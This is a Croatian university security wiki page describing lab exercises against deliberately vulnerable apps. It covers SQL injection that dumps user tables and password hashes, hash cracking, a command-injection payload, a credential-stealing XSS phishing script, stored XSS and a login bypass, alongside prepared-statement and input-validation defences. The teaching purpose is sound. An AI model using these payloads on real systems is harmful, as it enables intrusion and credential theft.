+Ovaj odgovor nam daje do znanja da se ne radi o "blind" sql injectionu, što nam olakšava daljnji rad.
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Nepoznati_a.PNG" class="image"><img alt="Nepoznati a.PNG" src="../images/3/36/Nepoznati_a.PNG" width="342" height="43" /></a></div></div>
+<p><br />
+Primjer s "proba" koji naravno ne prolazi
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Proba_proba.PNG" class="image"><img alt="Proba proba.PNG" src="../images/e/e2/Proba_proba.PNG" width="662" height="122" /></a></div></div>
+<p><br />
+(još jedan primjer odgovora)
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Proba_s_probom.PNG" class="image"><img alt="Proba s probom.PNG" src="../images/5/5a/Proba_s_probom.PNG" width="367" height="48" /></a></div></div>
+<p><br /><br />
+Također, možemo pokušati saznati neke informacije o serveru kako bi si dodatno olakšali upad, tako možemo pokušati saznati tko je user, ili npr. kako se zove baza. To je prikazano na sljedeća dva screenshot-a.
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Znamo_tko_je_user.PNG" class="image"><img alt="Znamo tko je user.PNG" src="../images/7/7c/Znamo_tko_je_user.PNG" width="665" height="193" /></a></div></div>
+<p><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Znamo_ime_baze.PNG" class="image"><img alt="Znamo ime baze.PNG" src="../images/1/12/Znamo_ime_baze.PNG" width="665" height="191" /></a></div></div>
+<p><br />
+Sada najprije idemo probati pronaći neke "korisne tablice". Za to treba pogledati u  "information_schema" bazu sačinjenu od nekoliko read-only tablica, koja sadrži podatke o podacima, u njoj se nalaze podaci poput imena baza koje se nalaze na MySQL serveru , tipovi podataka stupaca, prava pristupa itd. Sljedećim upitom ćemo dobiti sve&#160;!=sql baze na serveru i pokušati pronaći nešto zanimljivo.
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Tablica_useri.PNG" class="image"><img alt="Tablica useri.PNG" src="../images/7/76/Tablica_useri.PNG" width="860" height="801" /></a></div></div>
+<p><br />
+Ovim upitom se dobije veliki ispis pa je potrebno potražiti neka zanimljiva imena tablica, i tako se pronađe tablica koja se zove "users" što će nam kasnije uvelike pomoći. Sada je bitno pokušati dobiti nazive stupaca u toj tablici kako bi znali pronaći druge korisne podatke. Zbog toga ponovno koristimo information_schemu-u ovaj puta sa .columns i time ćemo dobiti okvirni izgled tablice users.
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Imena_stupaca.PNG" class="image"><img alt="Imena stupaca.PNG" src="../images/6/68/Imena_stupaca.PNG" width="940" height="482" /></a></div></div>
+<p><br />
+Sada kada znamo kako su podaci spremljeni, jednostavno možemo sljedećim upitom zatražiti ispis podataka koje želimo. Ovdje smo ispisali "username" i "password", ali ne čisti password, već njegov hash.
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Znamo_username_i_password.PNG" class="image"><img alt="Znamo username i password.PNG" src="../images/a/a8/Znamo_username_i_password.PNG" width="662" height="423" /></a></div></div>
+<p><br />
+Pogled u bazu, i vidimo da je dobiveni ispis točan. (ovo inače ne možemo raditi ako stvarno napadamo, ovo je samo provjera da je upit stvarno napravljen)
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Usporedba_s_bazom_je_ok.PNG" class="image"><img alt="Usporedba s bazom je ok.PNG" src="../images/2/20/Usporedba_s_bazom_je_ok.PNG" width="986" height="142" /></a></div></div>
+<p><br />
+Sada kada imamo username i hash-ove passworda, potrebno je razbiti hash kako bi doznali passworde. To možemo raditi na više načina. Najbrže je koristiti neku web stranicu kako bi eliminirali passworde koji se ponavljaju, a i smanjiti ćemo si vrijeme potrošeno na brute force i dictionary probijanje passworda, ukoliko je taj password već korišten prije, i postoji na web-u.
+<br />
+Za početak koristili smo ovu web stranicu<a href="http://md5.gromweb.com/" class="external autonumber" rel="nofollow">[1]</a> kako bi pronašli neke password-e
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Reverse_md5.PNG" class="image"><img alt="Reverse md5.PNG" src="../images/thumb/5/53/Reverse_md5.PNG/1000px-Reverse_md5.PNG" width="1000" height="623" /></a></div></div>
+<p><br />
+Ako password ne možemo pronaći ovako, što je dosta vjerojatno, možemo se baciti na brute force i dictionary napade. Za brute force sko koristili alat John the Ripper, ali ga nismo pustili do kraja jer mu je trebalo nešto više od 3 dana za sve moguće kombinacije, screenchot John-a možete vidjeti ovdje:
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:John.PNG" class="image"><img alt="John.PNG" src="../images/thumb/8/82/John.PNG/1000px-John.PNG" width="1000" height="768" /></a></div></div>
+<p><br />
+Budući da John nije htio raditi sa našim rječnicima, za to smo uposlili Cain-a koji je računao hash-eve riječi iz ova 4 rječnika (3 s weba, 1 sa wikija ovog kolegija- broj u imenu označava broj riječi u svakom rječniku)
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Rjecnici.PNG" class="image"><img alt="Rjecnici.PNG" src="../images/5/5b/Rjecnici.PNG" width="578" height="84" /></a></div></div>
+<p><br />
+Cain dictionary attack:
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:All_all.PNG" class="image"><img alt="All all.PNG" src="../images/thumb/d/d6/All_all.PNG/1000px-All_all.PNG" width="1000" height="528" /></a></div></div>
+<p><br /><br />
+Pronađeni passwordi:
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:4_od_5.PNG" class="image"><img alt="4 od 5.PNG" src="../images/0/0f/4_od_5.PNG" width="591" height="538" /></a></div></div>
+<p><br /><br />
+Budući da smo znali passworde, nismo uključili sve opcije koje Cain nudi, već samo onu najosnovniju (passwordi su bili u rječnicima), ali ukoliko bi se radilo o nepoznatim passwordima, bilo bi potrebno koristiti i sljedeće mogućnosti:
+<br />
+</p>
+<ul><li>As is (password) – ne mijenja riječi koje dolaze iz rječnika, uzima ih kakve jesu
+</li><li>Reverse (PASSWORD - DROWSSAP)
+</li><li>Lowercase – pretvara sve riječi u riječniku, u riječi pisane malim slovima
+</li><li>Uppercase - pretvara sve riječi u riječniku, u riječi pisane velikim slovima
+</li><li>Case Perms – radi kombinacije velikih i malih znakova u riječima iz rječnika
+</li><li>Two Numbers Hybrid Brute – dodaje 2 broja (u rasponu od 00 do 99) nakon svake riječi
+</li></ul>
+<p><br /><br />
+</p>
+<h4> <span class="mw-headline" id="SQL_Injection_.28Blind.29"><b>SQL Injection (Blind) </b> </span></h4>
+<p>Blind upit izgleda malo drugačije zbog dvije razlike, prva je što nema "or die" kako bi se izbjegle mysql greške, a drugi je dodani znak "@" koji ne dozvoljava ispis grešaka i čini blind injection (mogućim/ostvarivim). Osim navedenog, u *.php-u koji omogućava blind sql injection, koristi se i funkcija mysql_real_escape_string() koja dodaje  \ na početak sljedećih stringova \x00, \n, \r, \, ', " i \x1a, te ju je potrebno koristiti svaki puta prije slanja upita.
+</p><p>"obični":
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Nije_blind.PNG" class="image"><img alt="Nije blind.PNG" src="../images/0/02/Nije_blind.PNG" width="602" height="55" /></a></div></div>
+<p>Blind:
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Blind.PNG" class="image"><img alt="Blind.PNG" src="../images/3/3b/Blind.PNG" width="587" height="72" /></a></div></div>
+<p><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Blind7.PNG" class="image"><img alt="Blind7.PNG" src="../images/e/e0/Blind7.PNG" width="260" height="59" /></a></div></div>
+<p>Sljedeća 2 screenshot-a pokazuju izgled i dva primjera početnog testiranja forme za unos:
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Blind1.PNG" class="image"><img alt="Blind1.PNG" src="../images/f/ff/Blind1.PNG" width="658" height="195" /></a></div></div>
+<p><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Blind2.PNG" class="image"><img alt="Blind2.PNG" src="../images/a/a8/Blind2.PNG" width="663" height="194" /></a></div></div>
+<p><br />
+Kao i u prethodnom primjeru, cilj na je pronaći korisne informacije, nešto od čega bi krenuli dalje "kopati" po bazi, ali je otežano jer nemamo povratnu informaciju o našem upitu sve dok ne postavimo točan upit.
+<br /><br />
+Za početak možemo pokušati saznati verziju mysql-a:
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Blind_verzija.PNG" class="image"><img alt="Blind verzija.PNG" src="../images/e/e4/Blind_verzija.PNG" width="661" height="191" /></a></div></div>
+<p><br /> 
+a osim naredbe version, možemo koristiti i:
+</p>
+<ul><li>@@DBTS
+</li><li>@@LANGID
+</li><li>@@LANGUAGE
+</li><li>@@LOCK_TIMEOUT
+</li><li>@@MAX_CONNECTIONS
+</li><li>@@MAX_PRECISION
+</li><li>@@NESTLEVEL
+</li><li>@@OPTIONS
+</li><li>@@REMSERVER
+</li><li>@@SERVERNAME
+</li><li>@@SERVICENAME
+</li><li>@@SPID
+</li><li>@@TEXTSIZE
+</li></ul>
+<p><br /><br />
+Netočan upit:
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:2_je_0_ne_prolazi.PNG" class="image"><img alt="2 je 0 ne prolazi.PNG" src="../images/b/b0/2_je_0_ne_prolazi.PNG" width="433" height="110" /></a></div></div>
+<p><br /><br />
+Nema odgovora:
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Blind_4.PNG" class="image"><img alt="Blind 4.PNG" src="../images/7/7f/Blind_4.PNG" width="661" height="124" /></a></div></div>
+<p><br /><br />
+Zatim je potrebno sastaviti upit koji će dati odgovor iz kojega bi mogli pronaći nešto što bi nam koristilo. Zato smo ponovno koristili information.schema tablicu, ali ovaj puta uz .tables i tako dobili ispis sadržanih tablica. Nakon kraćeg pregleda, ponovno je lako uočiti tablicu "users", te će nam sljedeći koraci biti pookušati to iskoristiti.
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Blind_imamo_user_tablicu.PNG" class="image"><img alt="Blind imamo user tablicu.PNG" src="../images/f/f4/Blind_imamo_user_tablicu.PNG" width="637" height="792" /></a></div></div>
+<p><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Jos_jednom_useri.PNG" class="image"><img alt="Jos jednom useri.PNG" src="../images/4/4a/Jos_jednom_useri.PNG" width="1054" height="190" /></a></div></div>
+<p><br /><br />
+Sada kada smo prinašli tablicu s korisnicima, cilj nam je izvući iz nje podatke, a za to nam je ponovno potreban izgleda tablice, tj. imena stupaca.
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Stupci.PNG" class="image"><img alt="Stupci.PNG" src="../images/c/c8/Stupci.PNG" width="916" height="484" /></a></div></div>
+<p><br />
+Te na kraju ponovno dođemo do korisničkih imena i lozinki kao i u prethodnom primjeru, te pokušamo iz hash-a dobiti passworde.
+<br /><br />
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Pass.PNG" class="image"><img alt="Pass.PNG" src="../images/8/8e/Pass.PNG" width="659" height="420" /></a></div></div>
+<p><br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Tmatijak&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Tmatijak (stranica ne postoji)">Tmatijak</a> 20:02, 6. siječnja 2012. (CET)
+</p><p><br />
+</p><p>U većini ovih demonstracija koristiti će se kao osnovni software xampp sa Apache 2.2.21 web poslužiteljem te MySQL 5.5.16 poslužiteljem baze podataka, na poslužitelju se nalazi Mutillidae, te OWASP Mantra web preglednik.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Generalno_xampp.JPG" class="image"><img alt="Generalno xampp.JPG" src="../images/7/71/Generalno_xampp.JPG" width="455" height="404" /></a></div></div>
+<p>OWASP Mantra je web preglednik koji se zasniva na Mozilla Firefox pregledniku na koji su dodane ekstenzije koje mogu biti korisne prilikom penetracijskog testiranja. Mutillidae je pak web aplikacija koja se koristi za edukacijske svrhe, za vježbanje otkrivanja slabosti, ili za vježbanje hakiranja u kontroliranom okruženju.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Generalno_mantra_mutillidae.JPG" class="image"><img alt="Generalno mantra mutillidae.JPG" src="../images/thumb/c/ce/Generalno_mantra_mutillidae.JPG/800px-Generalno_mantra_mutillidae.JPG" width="800" height="435" /></a></div></div>
+<p><br />
+</p>
+<pre>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mladen.mestric&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mladen.mestric (stranica ne postoji)">Mladen.mestric</a> 00:42, 6. siječnja 2012. (CET)
+</pre>
+<h4> <span class="mw-headline" id="WebGoat_lekcije"> <b>WebGoat lekcije</b> </span></h4>
+<h5> <span class="mw-headline" id="Command_Injection"><b>Command Injection</b></span></h5>
+<p>U ovoj lekciji je potrebno izvršiti ubacivanje naredbe u aplikaciju. Ova aplikacija izvršava naredbe u
+command promptu pa joj možemo, proslijedivanjem traženog unosa proslijediti naredbu[Slika1].<br />
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:548px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Injection1.PNG" class="image"><img alt="Slika1" src="../images/b/bd/Injection1.PNG" width="546" height="203" class="thumbimage" /></a>  <div class="thumbcaption">Slika1</div></div></div></div>
+<p>Vrijednost koju šaljemo 
+serveru možemo mijenjati presretanjem HTTP poruke pomoću alata WebScarab koji obavlja ulogu proxya[Slika2]. Vrijednost
+polja 'HelpFile' dodajemo payload tako da konačna vrijednost izgleda ovako: AccessControlMatrix.help" &amp; netstat -a.
+Navodnicima se završava ime datoteke a znakom '&amp;' dodajemo svoju novu naredbu 'netstat -a' koja izlistava sve TCP i
+UDP konekcije[Slika3].
+</p><p><br />
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:862px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Injection2.PNG" class="image"><img alt="Slika2" src="../images/7/7e/Injection2.PNG" width="860" height="53" class="thumbimage" /></a>  <div class="thumbcaption">Slika2</div></div></div></div>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:555px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Injection3.PNG" class="image"><img alt="Slika3" src="../images/6/62/Injection3.PNG" width="553" height="561" class="thumbimage" /></a>  <div class="thumbcaption">Slika3</div></div></div></div>
+<p><br />
+<br />
+</p>
+<h5> <span class="mw-headline" id="Blind_SQL_Injection"><b>Blind SQL Injection</b></span></h5>
+<p>Iduća lekcija je Blind Injection. Aplikaciji je zadaća provjera valjanosti broja računa. U polje za unos je 
+omogućen unos broja računa. Nakon provjere, aplikacija ispisuje je li račun valjan ili nije. SQL naredba koju aplikacija
+koristi je:<br />
+</p>
+<pre><b>"SELECT * FROM user_data WHERE userid = "+accountNumber.</b> <br />
+</pre>
+<p>Zadatak je saznati ime korisnika računa 15613.
+Kako nam aplikacija vraća samo bool vrijednosti, ime možemo dobiti samo ako pogađamo slovo po slovo. U accountNumber 
+ćemo upisati<br /><br /> 
+</p>
+<pre><b>101 AND (ascii(substr((SELECT first_name FROM user_data WHERE userid=15613),1,1))&lt;77);</b><br /><br />
+</pre>
+<p>Time smo u već postojeću SQL sintaksu ubacili dodatni uvjet gdje za prvo slovo imena korisnika koji ima broj računa 15613 ispitujemo
+dali ima ascii vrijednost manju od 77. Ako nam aplikacija vrati istinu, to znači da je prvo slovo između A-L. Kombinirajući druge
+ascii vrijednosti s &lt;,&gt;,= operatorima, možemo dobiti prvo slovo. Isti postupak ponavljamo za sva slova. Na kraju se dobije Joesph.
+<br />
+<br />
+</p>
+<h5> <span class="mw-headline" id="Numeric_SQL_Injection"><b>Numeric SQL Injection</b></span></h5>
+<p>U ovoj lekciji je cilj dobiti podatke u vremenu za sve gradove[Slika4]. SQL sintaksa glasi:<br />
+</p>
+<pre><b>SELECT * FROM weather_data WHERE station =101</b> <br />
+</pre>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:380px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Injection4.PNG" class="image"><img alt="Slika4" src="../images/d/d5/Injection4.PNG" width="378" height="160" class="thumbimage" /></a>  <div class="thumbcaption">Slika4</div></div></div></div> 
+<p>Ako ubacimo dodatak u SQL sintaksu svaki red u tablici rezultira pronađenim redom[Slika5]. 
+Sintaksa na kraju izgleda 
+</p>
+<pre><b>SELECT * FROM weather_data WHERE station = 101 OR 1=1</b> <br />
+</pre>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:447px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Injection5.PNG" class="image"><img alt="Slika5" src="../images/e/e3/Injection5.PNG" width="445" height="265" class="thumbimage" /></a>  <div class="thumbcaption">Slika5</div></div></div></div>
+<p><br /><br />
+</p>
+<h5> <span class="mw-headline" id="String_SQL_Injection"><b>String SQL Injection</b></span></h5>
+<p>Ova lekcija je slična prethodnoj s tim da se kao unos traži string. Ako se unese 'Smith' ispišu se podaci o tom imenu[Slika6]. String koji se unosi se nalazi među navodnicima pa prethodni
+injection (OR 1=1) ovdje ne funkcionira. Ako dodamo ovaj izraz: Smith' OR 'x'='x, završna SQL naredba će izgledati ovako: <br />
+</p>
+<pre><b>SELECT * FROM user_data WHERE last_name = 'Smith' or 'x'='x'.</b>
+</pre>
+<p><br />
+Na taj način smo dobili podatke od svih korisnika[Slika7].
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:620px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Injection7.PNG" class="image"><img alt="Slika7" src="../images/a/a5/Injection7.PNG" width="618" height="387" class="thumbimage" /></a>  <div class="thumbcaption">Slika7</div></div></div></div>
+<p><br /><br />
+</p>
+<h5> <span class="mw-headline" id="Za.C5.A1tita_od_umetanja_znakova"><b>Zaštita od umetanja znakova</b></span></h5>
+<p>Kako bi se spriječilo umetanje znakova mogu se koristiti parametri umjesto korisničkih podataka u SQL naredbi. Umjesto<br />
+</p>
+<pre><b>"SELECT * FROM employee WHERE userid = "+userid + " and password = '" + password + "'";</b><br /> upisujemo ovo<br />
+<b>"SELECT * FROM employee WHERE userid =&#160;? and password =&#160;?";</b> <br />
+</pre>
+<p>Korištenjem 'PreparedStatement' klase omogućujemo brisanje meta-znakova unutar SQL naredbe pomoću JDBC drivera. Cijeli kod za sprječavanje bi mogao izgledati ovako<br />
+</p>
+<pre>
+ String query = &quot;SELECT * FROM employee WHERE userid =&#160;? and password =&#160;?&quot;;
+ try{
+     Connection connection = WebSession.getConnection(s);
+     PreparedStatement statement = connection.prepareStatement(query,ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);
+     statement.setString(1, userId);
+     statement.setString(2, password);
+     ResultSet answer_results = statement.executeQuery();
+     ...
+</pre>
+<p><br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Ivan.markovic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Ivan.markovic (stranica ne postoji)">Ivan.markovic</a> 19:24, 6. siječnja 2012. (CET)
+</p>
+<h3> <span class="mw-headline" id="Cross_site_scripting_.28A2.29"> <b>Cross site scripting (A2)</b> </span></h3>
+<p>Cross site scripting ili XSS skraćeno je problem koji se javlja kada određena web stranica ili aplikacija ne provjerava podatke koje prima već ih samo prosljeđuje u web preglednik. Za jednostavan primjer XSS-a možemo uzeti jednostavnu web stranicu koja prikazuje podatke o korisniku koji pristupa web stranica. 
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Xss_browserinfo.JPG" class="image"><img alt="Xss browserinfo.JPG" src="../images/thumb/9/97/Xss_browserinfo.JPG/800px-Xss_browserinfo.JPG" width="800" height="342" /></a></div></div>
+<p><br />
+Tako na takvoj stranici imamo podatke poput preglednika koji je korisnik koristio, operacijskog sustava korisnika, hostname korisnika, IP adresu korisnika i slično. Korištenjem opet OWASP mantra-e, mutillidae i xampp-a može se demonstrirati jednostavan primjer XSS napada. Naime mantra omogućuje promjenu korisničkog agenta te tako krivo predstavljanje poslužitelju, što samo po sebi može bit korisno. No korisnija opcija je kreiranje vlastitog agenta, što pak omogućuje ubacivanje koda u same podatke o agentu. Dakle korištenjem mantre kreira se novi agent kojem u neko polje možemo ubaciti jednostavan kod, u ovom slučaju jednostavnu skriptu. Skripta koju koristimo u ovom jednostavnom primjeru je: &lt;script&gt;alert('sup! ovo je tehnicki xss')&lt;/script&gt;.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Xss_novi_agent.JPG" class="image"><img alt="Xss novi agent.JPG" src="../images/a/aa/Xss_novi_agent.JPG" width="557" height="520" /></a></div></div>
+<p><br />
+Ta jednostavna skripta će izbaciti upozorenje sa odgovarajućim natpisom prilikom pokušaja očitavanja podataka korisnika. Naravno takva slabost omogućava zlonamjernom korisniku izvođenje proizvoljnog koda na poslužitelju.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Xss_rezultat.JPG" class="image"><img alt="Xss rezultat.JPG" src="../images/thumb/7/72/Xss_rezultat.JPG/800px-Xss_rezultat.JPG" width="800" height="369" /></a></div></div>
+<pre>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Mladen.mestric&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Mladen.mestric (stranica ne postoji)">Mladen.mestric</a> 00:42, 6. siječnja 2012. (CET)
+</pre>
+<h4> <span class="mw-headline" id="Webgoat_lekcije_2"> <b>Webgoat lekcije</b> </span></h4>
+<h5> <span class="mw-headline" id=".22Phishing.22_s_XSS-om"><b>"Phishing" s XSS-om</b></span></h5>
+<p>U ovoj lekciji aplikacija vrši pretraživanje i vraća rezultat. Ranjivost aplikacije je u tome što aplikacija
+ispiše korisnički unos nazad u preglednik kako bi javila za što je vršila pretraživanje. U tom slučaju unosimo
+html kod s formom gdje zahtjevamo od korisnika unos korisničkih podataka. S HTML-om dolazi i javascript kojim se
+mogu pokupiti uneseni podaci[Slika8].
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:618px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Xss1.PNG" class="image"><img alt="Slika8" src="../images/5/53/Xss1.PNG" width="616" height="418" class="thumbimage" /></a>  <div class="thumbcaption">Slika8</div></div></div></div>
+<p>Ako unesemo sljedeću skriptu u polje za unos, možemo preuzeti korisničke podatke unešene iz forme[Slika9]
+</p>
+<pre>
+&lt;script&gt;
+function xss(){
+    alert(&quot;Username=&quot;+document.forms[0].elements[&quot;username&quot;].value
+    +&quot;Password=&quot;+document.forms[0].elements[&quot;password&quot;].value);
+    XSSImage=new Image();
+    XSSImage.src=&quot;http://localhost/WebGoat/catcher?PROPERTY=yes&amp;user=
+    &quot;+document.forms[0].elements[&quot;username&quot;].value+&quot;&amp;password=&quot;+document.forms[0].elements[&quot;password&quot;].value;
+}
+&lt;/script&gt;
+
+&lt;form&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;HR&gt;
+&lt;H3&gt;You need to login to continue: &lt;/H3&gt;
+&lt;br&gt;&lt;br&gt;
+Username:&lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt;&lt;br&gt;
+Password: &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot;&gt;&lt;br&gt;
+&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;login&quot; onclick=&quot;xss()&quot;&gt;
+&lt;/form&gt;
+</pre>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:644px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Xss2.PNG" class="image"><img alt="Slika9" src="../images/f/f8/Xss2.PNG" width="642" height="264" class="thumbimage" /></a>  <div class="thumbcaption">Slika9</div></div></div></div>
+<h5> <span class="mw-headline" id="Stored_XSS"><b>Stored XSS</b></span></h5>
+<p>U ovoj aplikaciji je omogućeno ostavljanje poruke na serveru. Ukoliko se ne provjerava korisnički unos,
+moguće je ostaviti različit maliciozni kod. U ovom slučaju je ostavljen javascript kod koji izvršava alert s
+cookiem[Slika10 i Slika11].
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:570px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Xss3.PNG" class="image"><img alt="Slika10" src="../images/a/aa/Xss3.PNG" width="568" height="160" class="thumbimage" /></a>  <div class="thumbcaption">Slika10</div></div></div></div>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:554px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Xss4.PNG" class="image"><img alt="Slika11" src="../images/d/d2/Xss4.PNG" width="552" height="257" class="thumbimage" /></a>  <div class="thumbcaption">Slika11</div></div></div></div>
+<h5> <span class="mw-headline" id="Blokiranje_Store_XSS-a"><b>Blokiranje Store XSS-a</b></span></h5>
+<p>XSS se može blokirati tako da se ispita korisnički unos. Za tu potrebu se može koristiti regex. 
+U ovom slučaju se zajednički provjeravaju korisnički podaci. Dopuštaju se samo whitespace znakovi,
+slova i brojevi te znakovi '-' i ','
+<br />
+</p>
+<pre>
+String regex = &quot;[\\s\\w-,]*&quot;;
+String stringToValidate = firstName+lastName+ssn+title+phone+address1+address2+
+startDate+ccn+disciplinaryActionDate+
+disciplinaryActionNotes+personalDescription;
+Pattern pattern = Pattern.compile(regex);
+validate(stringToValidate, pattern);
+</pre>
+<p><br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Ivan.markovic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Ivan.markovic (stranica ne postoji)">Ivan.markovic</a> 19:24, 6. siječnja 2012. (CET)
+</p>
+<h3> <span class="mw-headline" id="Broken_authentication_.28A3.29"> <b>Broken authentication (A3)</b> </span></h3>
+<p>Ovaj tip rizika omogućava nekom neautoriziranom korisniku da dobije pristup nekom resursu, odnosno preuzme identitet nekog drugog legitimnog korisnika sustava, te korištenjem tog identiteta dođe do podataka koji inače ne bi trebali biti njemu dostupni, odnosno nanese štetu samom sustavu.
+Korištenjem OWASP mantre, xampp servera te mutillidae mogu se demonstrirati određeni nedostatci prilikom korištenja samo lokalne provjere predanih podataka prilikom autentifikacije. Naime korištenjem običnog SQL injection-a odnosno izraza "='or'1=1", ukoliko ne postoje nikakve provjere, prolazi se najobičnija SQL provjera lozinke korisnika, na višoj razini sigurnosti kod koje se uvode zabrane, odnosno provjere takvog tipa izraza na strani korisnika, takve je provjere još uvijek moguće zaobići korištenjem raznih alata. Prvo međutim moramo biti sigurni da je provjera unosa na korisničkoj strani, to možemo vidjeti korištenjem Httpfox ekstenzije koja prati komunikaciju između poslužitelja i klijenta. Ukoliko nema provjere na strani korisnika prilikom unošenja određenih zabranjenih znakova doći će do komunikacije između klijenta i poslužitelja što se vidi iz sljedeće slike.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Auth_httpfox.JPG" class="image"><img alt="Auth httpfox.JPG" src="../images/thumb/2/2a/Auth_httpfox.JPG/800px-Auth_httpfox.JPG" width="800" height="398" /></a></div></div>
+<p><br />
+Ukoliko pak postoji lokalna provjera neće biti komunikacije između poslužitelja i klijenta, nego će se javiti poruka sa greškom koja upozorava na nedopuštene znakove kod prijave.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Auth_lokalna_provjera.JPG" class="image"><img alt="Auth lokalna provjera.JPG" src="../images/thumb/b/b9/Auth_lokalna_provjera.JPG/800px-Auth_lokalna_provjera.JPG" width="800" height="399" /></a></div></div>
+<p>Jednom kada potvrdimo da se provjerava prvo lokalno možemo preći na sljedeći korak. Korištenjem Tamper Data može se generirati upit prema serveru koji će zaobići lokalnu provjeru i opet korištenjem SQL injection-a riješiti autentifikaciju na server, ukoliko naravno ne postoji i provjera sa strane poslužitelja.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Auth_tamper_pocetni.JPG" class="image"><img alt="Auth tamper pocetni.JPG" src="../images/b/b1/Auth_tamper_pocetni.JPG" width="454" height="646" /></a></div></div>
+<p><br />
+Zaobilaženje lokalne provjere slanjem modificiranog zahtjeva direktno poslužitelju.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Auth_tamper_promjenjen.JPG" class="image"><img alt="Auth tamper promjenjen.JPG" src="../images/2/2c/Auth_tamper_promjenjen.JPG" width="601" height="601" /></a></div></div>
